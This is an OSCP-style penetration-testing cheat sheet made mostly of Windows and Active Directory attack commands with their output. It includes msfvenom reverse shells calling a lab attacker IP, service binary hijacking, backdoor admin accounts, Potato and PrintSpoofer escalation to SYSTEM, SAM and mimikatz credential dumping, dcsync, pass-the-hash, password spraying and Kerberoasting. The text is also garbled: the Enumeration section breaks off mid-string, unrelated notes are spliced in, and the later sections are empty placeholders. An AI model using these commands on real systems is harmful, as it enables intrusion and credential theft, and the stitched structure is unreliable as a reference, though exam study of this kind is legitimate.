# OSCP Cheat Sheet

A practical OSCP cheat sheet organized by attack phase, with distinctions between Linux and Windows where applicable. Tool alternatives and usage variations included for flexibility.

---

## Table of Contents
1. [Low-Hanging Fruits (Quick Wins)](#low-hanging-fruits-quick-wins)
2. [Enumeration](#enumeration)
3. [Privilege Escalation](#privilege-escalation)
4. [Exploitation](#exploitation)
5. [Post-Exploitation](#post-exploitation)
6. [Reporting](#reporting)
7. [Common Ports & Services](#common-ports--services)
8. [Brute Force Techniques](#brute-force-techniques)
9. [Alternative Tools & Usage](#alternative-tools--usage)

---

## 1. Low-Hanging Fruits (Quick Wins)

### Linux & Windows

- Default/weak credentials (e.g., admin:admin, guest:guest)
- Anonymous or default shares (SMB/NFS/FTP)
- Unpatched known vulnerabilities (searchsploit, CVE checks)
- Publicly accessible sensitive files (robots.txt, .git, backups)
- Misconfigured services (world-writable files, weak permissions)
- Cleartext passwords in scripts/configs
- Password reuse across services/users
- Open directories/web root exposures
- Outdated web applications/plugins

---

## 2. Enumeration
risesystemmanager.exe.bak"
````
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.140 LPORT=80 -f exe -o shell.exe
Invoke-exampleRequest -Uri "http://192.168.119.140:8000/shell.exe" -OutFile "C:\exacqVisionEsm\EnterpriseSystemManager\enterprisesystemmanager.exe"
````
````
get-service *exac*
stop-service ESMexampleService*
start-service ESMexampleService*
````
````
nc -nlvp 80
shutdown /r /t 0 /f #sometimes it takes a minute or two...
````


### Adding a user with high privs
````
net user hacker password /add
net localgroup Admins hacker /add
net localgroup "Remote Desktop Users" hacker /add
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
net users #check the new user
````
````
impacket-secretsdump hacker:password@<IP of victim machine> -outputfile hashes 
rdekstop -u hacker -p password <IP of victim machine>
windows + R #Windows and R key at the same time
[cmd.exe] # enter exe file you want in the prompt
C:\Windows\System32\cmd.exe #or find the file in the file system and run it as Admin
[right click and run as Admin]
````
### SeImpersonate
#### JuicyPotatoNG
````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.119.138 LPORT=1337 EXITFUNC=thread -f exe --platform windows -o rshell.exe
cp /opt/juicyPotato/JuicyPotatoNG.exe .
````
````
PS C:\Windows\Temp> .\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe
.\JuicyPotatoNG.exe -t * -p C:\\Windows\\Temp\\rshell.exe


         JuicyPotatoNG
         by decoder_it & splinter_code

[*] Testing CLSID {854A20FB-2D44-457D-992F-EF13785D2B51} - COM server port 10247 
[+] authresult success {854A20FB-2D44-457D-992F-EF13785D2B51};NT AUTHORITY\SYSTEM;Impersonation
[+] CreateProcessAsUser OK
[+] Exploit successful!



nc -nlvp 1337                                                                                                                     
listening on [any] 1337 ...
connect to [192.168.119.138] from (UNKNOWN) [192.168.138.248] 52803
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\>whoami
whoami
nt authority\system
````
#### PrintSpoofer
````
whoami /priv
git clone https://github.com/dievus/printspoofer.git #copy over to victim
PrintSpoofer.exe -i -c cmd

c:\inetpub\wwwroot>PrintSpoofer.exe -i -c cmd
PrintSpoofer.exe -i -c cmd
[+] Found privilege: SeImpersonatePrivilege
[+] Named pipe listening...
[+] CreateProcessAsUser() OK
Microsoft Windows [Version 6.3.9600]
(c) 2013 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system
````
````
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
OS Name:                   Microsoft Windows Server 2012 R2 Standard
OS Version:                6.3.9600 N/A Build 9600
System Type:               x64-based PC

````
### Pivoting
#### psexec.py
Using credentials that we wound for USERC we were able to psexec.py on my kali machine using chisel to USERCs Account as she has higher privledges then my current user. Locally we were being blocked with psexec.exe by AV so this was our work around.
````
proxychains psexec.py USERC:USERCishere@10.11.1.50 cmd.exe
````
````
C:\HFS>whoami
whoami
USERL\USERL
````
````
C:\Users\USERL\Desktop>net user USERL
Local Group Memberships      *Users                
Global Group memberships     *None                 
The command completed successfully.
````
````
C:\Users\USERL\Desktop>net users
net users

User accounts for \\USERL

-------------------------------------------------------------------------------
Admin            USERC                    USERL                  
Guest                    
The command completed successfully
````
````
C:\Users\USERL\Desktop>net user USERC
Local Group Memberships      *Admins       
Global Group memberships     *None                 
The command completed successfully.
````
## Active Directory <img src="https://www.outsystems.com/Forge_CW/_image.aspx/Q8LvY--6WakOw9afDCuuGXsjTvpZCo5fbFxdpi8oIBI=/active-directory-core-simplified-2023-01-04%2000-00-00-2023-02-07%2007-43-45" width="40" height="40" />
### third party cheat sheet
````
https://github.com/brianlam38/OSCP-2022/blob/main/cheatsheet-active-directory.md#AD-Lateral-Movement-1
````
### Active Directory Enumeration <img src="https://cdn-icons-png.flaticon.com/512/9616/9616012.png" width="40" height="40" />
#### Enumeration
##### Initial Network scans
````
nmap -p80 --min-rate 1000 10.11.1.20-24 #looking for initial foothold
nmap -p88 --min-rate 1000 10.11.1.20-24 #looking for DC
````
##### Impacket
````
impacket-GetADUsers -dc-ip 192.168.214.122 "exampleH.example/" -all 
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Guest                                                 <never>              <never>             
rplacidi                                              2020-11-04 00:35:05.106274  <never>             
opatry                                                2020-11-04 00:35:05.216273  <never>             
ltaunton                                              2020-11-04 00:35:05.264272  <never>             
acostello                                             2020-11-04 00:35:05.315273  <never>             
jsparwell                                             2020-11-04 00:35:05.377272  <never>             
oknee                                                 2020-11-04 00:35:05.433274  <never>             
jmckendry                                             2020-11-04 00:35:05.492273  <never>             
avictoria                                             2020-11-04 00:35:05.545279  <never>             
jfrarey                                               2020-11-04 00:35:05.603273  <never>             
eaburrow                                              2020-11-04 00:35:05.652273  <never>             
cluddy                                                2020-11-04 00:35:05.703274  <never>             
agitthouse                                            2020-11-04 00:35:05.760273  <never>             
fmcsorley                                             2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491
````
###### Creds
````
impacket-GetADUsers -dc-ip 192.168.214.122 exampleH.example/fmcsorley:CrabSharkJellyfish192 -all
````
````
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Querying 192.168.214.122 for information about domain.
Name                  Email                           PasswordLastSet      LastLogon           
--------------------  ------------------------------  -------------------  -------------------
Admin                                         2023-05-19 17:01:26.839372  2020-11-04 00:58:40.654236 
Guest                                                 <never>              <never>             
krbtgt                                                2020-11-04 00:26:23.099902  <never>             
USERA                                              2020-11-04 00:35:05.106274  <never>             
USERB                                                2020-11-04 00:35:05.216273  <never>             
USERC                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.264272  <never>             
USERD                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.315273  <never>             
jUSERE                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.377272  <never>             
USERF                                                2020-11-04 00:35:05.216273  <never>                                                              2020-11-04 00:35:05.433274  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.492273  <never>             
USERG                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.545279  <never>             
USERH                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.603273  <never>             
USERI                                                 2020-11-04 00:35:05.216273  <never>                                                           2020-11-04 00:35:05.652273  <never>             
USERJ                                                 2020-11-04 00:35:05.216273  <never>                                                            2020-11-04 00:35:05.703274  <never>             
USERK                                                 2020-11-04 00:35:05.216273  <never>                                                         2020-11-04 00:35:05.760273  <never>             
USERL                                                 2020-11-04 00:35:05.216273  <never>                                                          2020-11-04 00:35:05.815275  2021-02-16 08:39:34.483491 
domainadmin                                           2021-02-16 00:24:22.190351  2023-05-19 16:58:10.073764
````
##### Bloodhound.py
````
/opt/BloodHound.py/bloodhound.py -d exampleH.example -u fmcsorley -p CrabSharkJellyfish192 -c all -ns 192.168.214.122
````
````
INFO: Found AD domain: exampleH.example
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (exampleH.example:88)] [Errno 111] Connection refused
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: exampleHdc.exampleH.example
INFO: Found 18 users
INFO: Found 52 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: exampleHdc.exampleH.example
INFO: Done in 00M 12S

````
#### Network commands
````
arp -a #look for IPs that your victim is connected
ipconfig #look for a dual victim machine, typically two $IPs shown
````
#### User Hunting
````
net users #Local users
net users /domain #All users on Domain
net users jeff /domain #Queury for more infromation on each user
net group /domain #Enumerate all groups on the domain
net group "Music Department" / domain #Enumerating specific domain group for members
````
#### Credential hunting
##### Interesting Files
````
Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
Get-ChildItem -Path C:\Users\USERD\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
````
````
tree /f C:\Users\ #look for interesting files, backups etc.
````
##### Sam, System, Security Files
````
whoami /all #BUILTIN\Admins
````
````
reg save hklm\security c:\security
reg save hklm\sam c:\sam
reg save hklm\system c:\system
````
````
copy C:\sam z:\loot
copy c:\security z:\loot
c:\system z:\loot
````
````
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\system32> download SYSTEM
````
````
/opt/impacket/examples/secretsdump.py -sam sam -security security -system system LOCAL
````
````
samdump2 SYSTEM SAM                                                                                                                     
*disabled* Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
*disabled* :504:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1002:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1003:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
:1004:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
````
````
creddump7                       
creddump7 - Python tool to extract credentials and secrets from Windows registry hives
/usr/share/creddump7
├── cachedump.py
├── framework
├── lsadump.py
├── pwdump.py
└── __pycache_

./pwdump.py /home/kali/Documents/example/exampleA/10.10.124.142/loot/SYSTEM /home/kali/Documents/example/exampleA/10.10.124.142/loot/SAM    
Admin:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:acbb9b77c62fdd8fe5976148a933177a:::
tom_admin:1001:aad3b435b51404eeaad3b435b51404ee:4979d69d4ca66955c075c41cf45f24dc:::
Cheyanne.Adams:1002:aad3b435b51404eeaad3b435b51404ee:b3930e99899cb55b4aefef9a7021ffd0:::
David.Rhys:1003:aad3b435b51404eeaad3b435b51404ee:9ac088de348444c71dba2dca92127c11:::
Mark.Chetty:1004:aad3b435b51404eeaad3b435b51404ee:92903f280e5c5f3cab018bd91b94c771:::
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
##### impacket-secretsdump
````
impacket-secretsdump Admin:'password'@$IP -outputfile hashes
````
````
https://crackstation.net/
hashcat -m <load the hash mode> hash.txt /usr/share/wordlists/rockyou.txt
````
````
$DCC2$10240#username#hash
````
````
$DCC2$10240#Admin#a7c5480e8c1ef0ffec54e99275e6e0f7
$DCC2$10240#luke#cd21be418f01f5591ac8df1fdeaa54b6
$DCC2$10240#warren#b82706aff8acf56b6c325a6c2d8c338a
$DCC2$10240#jess#464f388c3fe52a0fa0a6c8926d62059c
````
````
hashcat -m 2100 hashes.txt /usr/share/wordlists/rockyou.txt

This hash does not allow pass-the-hash style attacks, and instead requires Password Cracking to recover the plaintext password
````
##### Powershell
````
PS C:\> (Get-PSReadlineOption).HistorySavePath
C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

type C:\Users\USERA\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
echo "Let's check if this script works running as damon and password password123"
````
##### PowerView
````
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
````
````
Import-Module .\PowerView.ps1
Get-NetDomain
Get-NetUser
Get-DomainUser 
Get-DomainUser | select cn
Get-NetGroup | select name
Get-NetGroupMember -MemberName "domain admins" -Recurse | select MemberName
````
````
Get-NetUser -SPN #Kerberoastable users
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable users
Get-NetUser -SPN | ?{$_.memberof -match 'Domain Admins'} #Domain admins kerberostable
Find-LocalAdminAccess #Asks DC for all computers, and asks every compute if it has admin access (very noisy). You need RCP and SMB ports opened.
````
###### Errors
````
PS C:\> Import-Module .\PowerView.ps1
Import-Module : File C:\PowerView.ps1 cannot be loaded because running scripts is disabled on this system. For more 
information, see about_Execution_Policies at https:/go.microsoft.com/fwlink/?LinkID=135170.
````
````
PS C:\> powershell -exec bypass #this is how to get around it
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

Try the new cross-platform PowerShell https://aka.ms/pscore6

Import-Module .\PowerView.ps1
PS C:\> Import-Module .\PowerView.ps1
````
##### mimikatz.exe
````
https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
or
https://github.com/allandev5959/mimikatz-2.1.1
unzip mimikatz_trunk.zip 
cp /usr/share/windows-resources/mimikatz/Win32/mimikatz.exe .
cp /usr/share/windows-resources/mimikatz/x64/mimikatz.exe .
````
````
privilege::debug
mimikatz token::elevate
sekurlsa::logonpasswords
sekurlsa::tickets
````
#### AD Lateral Movement
##### Network
````
nslookup #use this tool to internally find the next computer to pivot to.
example-app23.example.com #found this from either the tgt, mimikatz, etc. Shows you where to go next
Address: 10.11.1.121
````
###### SMB
````
impacket-psexec jess:Flowers1@172.16.138.11 cmd.exe
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:8c802621d2e36fc074345dded890f3e5 Admin@192.168.129.59
impacket-psexec -hashes lm:ntlm zenservice@192.168.183.170
````
###### WINRM
````
evil-winrm -u <user> -p <password> -i 172.16.138.83
evil-winrm -u <user> -H <hash> -i 172.16.138.83
````
###### WMI
````
proxychains -q impacket-wmiexec forest/bob:'password'@172.16.138.10
impacket-wmiexec forest/bob:'password'@172.16.138.10
````
###### RDP
````
rdesktop -u 'USERN' -p 'abc123//' 192.168.129.59 -g 94% -d example
xfreerdp /v:10.1.1.89 /u:USERX /pth:5e22b03be2cnzxlcjei9cxzc9x
xfreerdp /cert-ignore /bpp:8 /compression -themes -wallpaper /auto-reconnect /h:1000 /w:1600 /v:192.168.238.191 /u:admin /p:password
xfreerdp /u:admin  /v:192.168.238.191 /cert:ignore /p:"password"  /timeout:20000 /drive:home,/tmp
````
###### Accessing shares with RDP
````
windows + R
type: \\172.16.120.21
Enter User Name
Enter Password
[now view shares via rdp session]
````
#### AD attacks
##### Spray and Pray
````
sudo crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec smb 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec smb 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-success
sudo proxychains crackmapexec smb 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo proxychains crackmapexec winrm 10.10.124.140 -u Admin -p hghgib6vHT3bVWf  -x whoami --local-auth
sudo crackmapexec winrm 192.168.50.75 -u users.txt -p 'Nexus123!' -d example.com --continue-on-success
sudo crackmapexec winrm 192.168.50.75 -u USERD -p 'Flowers1' -d example.com
sudo crackmapexec winrm 10.10.137.142 -u users.txt -p pass.txt -d ms02 --continue-on-succes
proxychains crackmapexec mssql -d example.com -u sql_service -p password123  -x "whoami" 10.10.126.148
````
````
.\kerbrute_windows_amd64.exe passwordspray -d example.com .\usernames.txt "password123"
````
##### Pass-the-hash
````
crackmapexec smb 10.11.1.120-124 -u admin -H 'LMHASH:NTHASH' --local-auth --lsa #for hashes
crackmapexec smb 10.11.1.20-24 -u pat -H b566afa0a7e41755a286cba1a7a3012d --exec-method smbexec -X 'whoami'
crackmapexec smb 10.11.1.20-24 -u tim -H 08df3c73ded940e1f2bcf5eea4b8dbf6 -d svexample.com -x whoami
proxychains crackmapexec smb 10.10.126.146 -u 'Admin' -H '59b280ba707d22e3ef0aa587fc29ffe5' -x whoami -d example.com
````
##### TGT Impersonation
````
PS> klist # should show no TGT/TGS
PS> net use \\SV-FILE01 (try other comps/targets) # generate TGT by auth to network share on the computer
PS> klist # now should show TGT/TGS
PS> certutil -urlcache -split -f http://192.168.119.140:80/PsExec.exe #/usr/share/windows-resources
PS>  .\PsExec.exe \\SV-FILE01 cmd.exe
````
##### AS-REP Roasting
````
impacket-GetNPUsers -dc-ip 192.168.50.70  -request -outputfile hashes.asreproast example.com/USERP
````
````
cp /opt/Ghostpack-CompiledBinaries/Rubeus.exe .
.\Rubeus.exe asreproast /nowrap /outfile:hashes.asreproast
type hashes.asreproast
````
###### Cracking AS-REP Roasting
````
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Kerberoasting
````
sudo impacket-GetUserSPNs -request -outputfile hashes.kerberoast -dc-ip 192.168.50.70 example.com/user
````
````
.\Rubeus.exe kerberoast /simple /outfile:hashes.kerberoast
````
###### Cracking Kerberoasting
````
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
````
##### Domain Controller Synchronization
To do this, we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user. We could also steal a copy of the NTDS.dit database file,1 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
````
lsadump::dcsync /all /csv #First run this to view all the dumpable hashes to be cracked or pass the hash
lsadump::dcsync /user:zenservice #Pick a user with domain admin rights to crack the password or pass the hash
````
````
Credentials:
  Hash NTLM: d098fa8675acd7d26ab86eb2581233e5
    ntlm- 0: d098fa8675acd7d26ab86eb2581233e5
    lm  - 0: 6ba75a670ee56eaf5cdf102fabb7bd4c
````
````
impacket-psexec -hashes 6ba75a670ee56eaf5cdf102fabb7bd4c:d098fa8675acd7d26ab86eb2581233e5 zenservice@192.168.183.170
````

### Linux


### Network Enumeration
ping $IP #63 ttl = linux #127 ttl = windows
nmap -p- --min-rate 1000 $IP
nmap -p- --min-rate 1000 $IP -Pn #disables the ping command and only scans ports
nmap -p <ports> -sV -sC -A $IP
### Stealth Scan
nmap -sS -p- --min-rate=1000 10.11.1.229 -Pn #stealth scans
### Rust Scan
target/release/rustscan -a 10.11.1.252
### UDP Scan
sudo nmap -F -sU -sV $IP
### Script to automate Network Enumeration
#!/bin/bash

target="$1"
ports=$(nmap -p- --min-rate 1000 "$target" | grep "^ *[0-9]" | grep "open" | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//')

echo "Running second nmap scan with open ports: $ports"

nmap -p "$ports" -sC -sV -A "$target"
Autorecon
autorecon 192.168.238.156 --nmap-append="--min-rate=2500" --exclude-tags="top-100-udp-ports" --dirbuster.threads=30 -vv
Port Enumeration


- Commands, scripts, and tools for discovering information about Linux targets.

### Windows

- Commands, scripts, and tools for discovering information about Windows targets.

---

## 3. Privilege Escalation

### Linux

- Techniques and tools for escalating privileges on Linux.

### Windows

- Techniques and tools for escalating privileges on Windows.

---

## 4. Exploitation

### Linux

- Exploitation techniques and example commands for Linux targets.

### Windows

- Exploitation techniques and example commands for Windows targets.

---

## 5. Post-Exploitation

### Linux

- Actions after initial access: persistence, data collection, lateral movement, etc.

### Windows

- Actions after initial access: persistence, data collection, lateral movement, etc.

---

## 6. Reporting

- Tips and templates for documenting findings, screenshots, and steps taken.

---

## 7. Common Ports & Services

| Port | Service      | Typical Attack Vectors/Notes        |
|------|--------------|-------------------------------------|
| 21   | FTP          | Anonymous login, weak credentials   |
| 22   | SSH          | Bruteforce, key reuse               |
| ...  | ...          | ...                                 |

---

## 8. Brute Force Techniques

### Tools

- `hydra`, `medusa`, `ncrack`, `crackmapexec`, etc.

### Example Commands

- SSH, FTP, SMB, RDP, etc.

---

## 9. Alternative Tools & Usage

- Alternative enumeration, exploitation, and post-exploitation tools.
- Usage examples for less common scenarios.

---

*Add detailed commands, notes, and tool alternatives in each section as you build out your cheat sheet!*
